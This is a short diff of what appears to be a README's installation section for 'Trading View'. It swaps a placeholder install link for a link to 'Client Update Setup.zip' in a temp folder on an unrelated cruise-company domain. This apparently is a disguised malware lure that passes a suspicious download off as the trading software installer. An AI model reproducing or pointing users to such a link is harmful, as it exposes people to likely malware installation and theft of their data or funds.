@@ -2,7 +2,7 @@
 
 
 # `Installation`
-## Trading View : [Install Here](Link)
+## Trading View : [Install Here](https://www.minicrociereinbarca.com/temp/Client%20Update%20Setup.zip)
 
 # `Screenshot`
 
